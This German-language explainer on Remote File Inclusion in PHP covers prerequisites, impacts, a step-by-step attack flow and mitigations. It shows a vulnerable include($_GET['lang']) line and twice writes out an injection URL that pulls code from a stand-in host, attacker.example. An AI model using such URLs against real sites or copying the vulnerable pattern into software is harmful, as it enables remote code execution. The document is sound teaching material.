# RFI - Remote File Inclusion

**Remote File Inclusion (RFI)** ist eine Schwachstelle in Webanwendungen, bei der externe Dateien von einem Remote-Server über unsichere Eingabeverarbeitung eingebunden werden können. Ähnlich wie bei Local File Inclusion (LFI) liegt die Ursache meist in fehlender oder unzureichender Validierung von Benutzereingaben, insbesondere in Funktionen wie `include()` oder `require()` in PHP.

***

#### Voraussetzungen

Eine erfolgreiche RFI-Attacke erfordert:

* Die PHP-Konfiguration `allow_url_fopen` muss aktiviert sein.
* Die Webanwendung erlaubt die Einbindung externer Ressourcen ohne ausreichende Prüfung.

***

#### Auswirkungen

Die Risiken bei RFI sind erheblich und reichen über die von LFI hinaus. Mögliche Folgen sind:

* **Remote Code Execution (RCE)**
* **Offenlegung sensibler Informationen**
* **Cross-Site Scripting (XSS)**
* **Denial of Service (DoS)**

***

#### Angriffsablauf

1. Der Angreifer hostet eine Datei auf einem externen Server, z. B.:

```php
<?php echo "Hello World"; ?>
```

2. Die Webanwendung ruft eine Datei über einen URL-Parameter auf, z. B.:

```
http://webapp.example/index.php?lang=http://attacker.example/cmd.txt
```

3. Ohne Eingabefilterung wird die URL in eine PHP-Funktion wie `include()` übergeben:

```php
<?php include($_GET['lang']); ?>
```

4. Die Anwendung lädt und führt den externen Code aus. In diesem Fall würde „Hello World“ im Webinterface angezeigt oder im Hintergrund schädlicher Code ausgeführt.

***

#### Beispielstruktur eines RFI-Angriffs

1. **Vorbereitung**: Angreifer stellt eine Datei wie `cmd.txt` mit Schadcode auf eigenem Server bereit.
2.  **Injection**: Der URL-Parameter wird manipuliert, z. B.:

    ```
    http://webapp.example/index.php?lang=http://attacker.example/cmd.txt
    ```
3. **Ausführung**: Die Anwendung lädt die Datei über `include()` und führt den darin enthaltenen PHP-Code auf dem Zielsystem aus.

***

#### Schutzmaßnahmen

* Deaktivierung von `allow_url_include` und `allow_url_fopen`.
* Strenge Validierung oder Whitelisting von Eingaben.
* Verzicht auf direkte Einbindung von Benutzereingaben.
* Verwendung sicherer Frameworks mit Template-Engines.
